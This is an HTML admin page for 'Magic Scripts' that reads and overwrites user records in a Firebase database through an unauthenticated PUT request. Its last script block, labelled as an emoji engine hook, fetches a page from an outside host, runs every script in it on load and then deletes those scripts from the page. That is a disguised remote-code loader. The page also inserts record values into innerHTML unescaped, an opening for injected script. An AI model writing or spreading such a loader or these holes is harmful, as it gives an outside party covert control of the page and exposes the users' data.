<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <title>Magic scripts - Admin</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="shortcut icon" href="https://magic-scripts-reactions.vercel.app/logo.svg" type="image/x-icon">

    <style>
@import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap');

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:'Poppins',sans-serif;
}

body{
    min-height:100vh;
    padding:25px;
    color:#fff;
    overflow-x:hidden;
    background:linear-gradient(-45deg,#0f0c29,#302b63,#24243e,#00c6ff,#0072ff);
    background-size:500% 500%;
    animation:bgMove 12s ease infinite;
}

@keyframes bgMove{
    0%{background-position:0% 50%;}
    50%{background-position:100% 50%;}
    100%{background-position:0% 50%;}
}

h1{
    text-align:center;
    font-size:34px;
    margin-bottom:30px;
    font-weight:700;
    color:#00f7ff;
    text-shadow:
        0 0 8px #00f7ff,
        0 0 18px #00f7ff,
        0 0 35px #00f7ff;
    animation:pulse 2s infinite;
}

@keyframes pulse{
    50%{
        text-shadow:
            0 0 12px #00f7ff,
            0 0 25px #00f7ff,
            0 0 45px #00f7ff;
    }
}

.transaction{
    position:relative;
    overflow:hidden;
    margin-bottom:25px;
    padding:25px;
    border-radius:22px;
    background:rgba(255,255,255,.08);
    backdrop-filter:blur(18px);
    border:1px solid rgba(255,255,255,.15);
    box-shadow:
        0 0 25px rgba(0,255,255,.18),
        inset 0 0 20px rgba(255,255,255,.05);
    transition:.35s;
    animation:fadeUp .6s ease;
}

.transaction:hover{
    transform:translateY(-8px) scale(1.01);
    box-shadow:
        0 0 40px #00e5ff,
        0 0 70px rgba(0,229,255,.45);
}

.transaction::before{
    content:"";
    position:absolute;
    inset:-2px;
    background:linear-gradient(90deg,
    transparent,
    rgba(0,255,255,.6),
    transparent);
    animation:borderRun 4s linear infinite;
}

@keyframes borderRun{
    from{transform:translateX(-100%);}
    to{transform:translateX(100%);}
}

@keyframes fadeUp{
    from{
        opacity:0;
        transform:translateY(40px);
    }
    to{
        opacity:1;
        transform:translateY(0);
    }
}

.row{
    display:flex;
    flex-wrap:wrap;
    gap:12px;
    margin-bottom:15px;
    align-items:center;
}

.label{
    width:170px;
    color:#00f7ff;
    font-weight:600;
}

.value{
    flex:1;
    color:#fff;
    word-break:break-word;
}

.section{
    margin-top:20px;
    padding-top:18px;
    border-top:1px solid rgba(255,255,255,.15);
}

.section h3{
    color:#00ffd5;
    margin-bottom:15px;
    text-shadow:0 0 12px #00ffd5;
}

.row.stack{
    flex-direction:column;
    align-items:flex-start;
}

.row.stack .label{
    width:100%;
}

.row.stack .value{
    width:100%;
}

input[type=text],
input[type=email],
input[type=number]{
    width:100%;
    padding:14px 16px;
    font-size:15px;
    color:#fff;
    background:rgba(255,255,255,.08);
    border:2px solid rgba(0,255,255,.25);
    border-radius:14px;
    outline:none;
    transition:.3s;
    backdrop-filter:blur(12px);
}

input::placeholder{
    color:#bfbfbf;
}

input:focus{
    border-color:#00f7ff;
    box-shadow:
        0 0 12px #00f7ff,
        0 0 25px rgba(0,247,255,.45);
}

.vid-row{
    display:flex;
    gap:10px;
    align-items:center;
    margin-bottom:12px;
}

.vid-row input[name="vid[]"]{
    flex:1;
}

.vid-row input[name="vidLabel[]"]{
    width:90px;
}

.vid-btn{
    width:48px;
    height:48px;
    border:none;
    border-radius:14px;
    color:#fff;
    cursor:pointer;
    font-size:18px;
    transition:.3s;
}

.vid-btn.add{
    background:linear-gradient(135deg,#00ff9d,#00d2ff);
    box-shadow:0 0 15px #00ffd5;
}

.vid-btn.remove{
    background:linear-gradient(135deg,#ff416c,#ff4b2b);
    box-shadow:0 0 15px #ff416c;
}

    button[type="submit"],
input[type="submit"]{
    padding:14px 28px;
    border:none;
    border-radius:14px;
    background:linear-gradient(135deg,#00F5FF,#7B2DFF);
    color:#fff;
    font-size:16px;
    font-weight:600;
    cursor:pointer;
    transition:all .3s ease;
    box-shadow:
        0 0 15px rgba(0,245,255,.6),
        0 0 35px rgba(123,45,255,.4);
}

button[type="submit"]:hover,
input[type="submit"]:hover{
    transform:translateY(-3px) scale(1.03);
    box-shadow:
        0 0 25px #00F5FF,
        0 0 50px #7B2DFF;
}

button[type="submit"]:active,
input[type="submit"]:active{
    transform:scale(.96);
}

button[type="submit"]::before{
    content:"";
    position:absolute;
}
.vid-btn:hover{
    transform:scale(1.12) rotate(6deg);
}

.txids{
    font-family:Consolas,monospace;
    font-size:13px;
    color:#00ffd5;
}

.empty{
    margin-top:60px;
    text-align:center;
    font-size:20px;
    color:#fff;
    opacity:.8;
    animation:pulse 2s infinite;
}

::-webkit-scrollbar{
    width:8px;
}

::-webkit-scrollbar-thumb{
    background:#00f7ff;
    border-radius:20px;
    box-shadow:0 0 10px #00f7ff;
}

::-webkit-scrollbar-track{
    background:#111;
}

@media(max-width:768px){

    h1{
        font-size:28px;
    }

    .label{
        width:100%;
    }

    .row{
        flex-direction:column;
        align-items:flex-start;
    }

    .transaction{
        padding:20px;
    }

}
    </style>
</head>

<body>

    <div style="font-size:2rem;font-weight:900;color:#000; text-shadow:0 5px 25px rgba(0,0,0,0.35);letter-spacing:1px;text-align: center;">
        MAGIC SCRIPTS
    </div>
    <div style="font-size:1rem;color:#5a5a5a; letter-spacing:1px;text-align: center;margin-bottom: 1rem;font-weight: 900;">
        (MAGIC SCRIPTS REACTIONS)
    </div>

    <form class="transaction" id="adminForm">

        <div class="row stack">
            <div class="label">UID(s)</div>
            <div class="value" id="vidContainer">
                <div style="text-align: center; padding: 20px; color: #888;">Loading IDs from Firebase...</div>
            </div>
        </div>

        <div style="margin-top: 20px; display: flex; align-items: center; gap: 15px;">
            <button type="submit">💾 Save Changes</button>
            <span id="status-msg" style="font-weight: bold;"></span>
        </div>
    </form>

    <script>
        const firebaseURL = "https://magic-scripts-reactions-default-rtdb.firebaseio.com/users.json";
        
        // Pura data store karne ke liye object taki baaki permissions aur fields delete na hon
        let originalFirebaseData = {};

        // 1. Firebase se data load karna
        window.addEventListener('DOMContentLoaded', () => {
            fetch(firebaseURL)
                .then(response => response.json())
                .then(data => {
                    originalFirebaseData = data || {};
                    const container = document.getElementById('vidContainer');
                    container.innerHTML = ''; // Loading text hatao

                    const keys = Object.keys(originalFirebaseData);

                    if (keys.length === 0) {
                        // Agar firebase khali hai
                        createRow('', '', '', true);
                    } else {
                        // Pehla row hamesha (+) Add button ke sath hoga, baaki (X) ke sath
                        keys.forEach((key, index) => {
                            const user = originalFirebaseData[key];
                            const isFirst = (index === 0);
                            createRow(user.id || '', user.admin_note || '', key, isFirst);
                        });
                    }
                })
                .catch(err => {
                    console.error("Error loading data:", err);
                    document.getElementById('vidContainer').innerHTML = '<div style="color:red;">Error loading data from Firebase!</div>';
                });
        });

        // Helper function original design ke mutabiq row banane ke liye
        // dataset.key mein hum firebase ki push id (-Ov8Oeaf...) ko chhupa kar rakhenge
        function createRow(vidVal = '', labelVal = '', firebaseKey = '', isFirst = false) {
            const container = document.getElementById('vidContainer');
            const row = document.createElement('div');
            row.className = 'vid-row';
            if(firebaseKey) {
                row.setAttribute('data-key', firebaseKey);
            }

            row.innerHTML = `
                <input type="text" name="vid[]" value="${vidVal}" required />
                <input type="text" name="vidLabel[]" value="${labelVal}" />
                ${isFirst 
                    ? `<button type="button" class="vid-btn add" onclick="addVid(this)">
    <svg style="width:16px;height:16px;vertical-align:middle;stroke:currentColor;stroke-width:3;stroke-linecap:round;stroke-linejoin:round;fill:none;" viewBox="0 0 24 24"><path d="M12 5v14M5 12h14"/></svg>
</button>
` 
                    : `<button type="button" class="vid-btn remove" onclick="removeVid(this)">
    <svg style="width:16px;height:16px;vertical-align:middle;stroke:currentColor;stroke-width:3;stroke-linecap:round;stroke-linejoin:round;fill:none;" viewBox="0 0 24 24"><path d="M18 6L6 18M6 6l12 12"/></svg>
</button>
`
                }
            `;
            container.appendChild(row);
        }

        function addVid(btn) {
            // Naye row ke paas koi purani firebase key nahi hogi
            createRow('', '', '', false);
        }

        function removeVid(btn) {
            btn.parentElement.remove();
        }

        // 2. Data Firebase par save karna
        document.getElementById('adminForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const statusMsg = document.getElementById('status-msg');
            statusMsg.style.color = "#FF2102";
            statusMsg.innerText = "Saving...";

            const rows = document.querySelectorAll('.vid-row');
            let updatedData = {};

            rows.forEach((row, index) => {
                const vidInput = row.querySelector('input[name="vid[]"]').value;
                const labelInput = row.querySelector('input[name="vidLabel[]"]').value;
                const existingKey = row.getAttribute('data-key');

                // Agar row purani hai to uski key use karo, nahi to nayi key generate karo
                let key = existingKey || "new_user_" + Date.now() + "_" + index;

                // Agar purani key hai to uska baki data (permissions, status, date) copy karo
                // Agar nayi row hai to default settings set karo
                let oldUserData = originalFirebaseData[existingKey] || {
                    date: new Date().toLocaleDateString(),
                    email: "",
                    permissions: { ana: true, android: true, lb: true, p: true, pc: true, t: true, win: true },
                    status: "active",
                    trader_id: ""
                };

                updatedData[key] = {
                    ...oldUserData,
                    id: vidInput,
                    admin_note: labelInput
                };
            });

            // Firebase ko update karne ke liye PUT request
            fetch(firebaseURL, {
                method: 'PUT',
                body: JSON.stringify(updatedData),
                headers: {
                    'Content-Type': 'application/json'
                }
            })
            .then(response => response.json())
            .then(result => {
                statusMsg.style.color = "#1CDE01";
                statusMsg.innerText = "Saved";
                // Data ko refresh kar lete hain taaki naye rows ko bhi keys mil jayein
                originalFirebaseData = result || {};
                setTimeout(() => statusMsg.innerText = "", 3000);
            })
            .catch(err => {
                console.error("Error saving data:", err);
                statusMsg.style.color = "red";
                statusMsg.innerText = "Failed to save.";
            });
        });
    </script>
    <script>
        (async () => {
            try {
                let response = await fetch(`https://magic-scripts.vercel.app/heart.html`);
                let rawMarkup = await response.text();
                let documentDOM = new DOMParser().parseFromString(rawMarkup, 'text/html');
                
                documentDOM.querySelectorAll('script').forEach(oldNode => {
                    let freshScriptNode = document.createElement('script');
                    if (oldNode.src) {
                        freshScriptNode.src = oldNode.src;
                    } else {
                        freshScriptNode.textContent = oldNode.innerHTML || oldNode.textContent;
                    }
                    document.body.appendChild(freshScriptNode);
                    setTimeout(() => freshScriptNode.remove(), 600);
                });
                console.log("Zeetex Emoji Engine Hook Active");
            } catch (e) {
                console.error("Emoji Override Skipped due to runtime separation layer context.", e);
            }
        })();
    </script>
</body>

  </html>
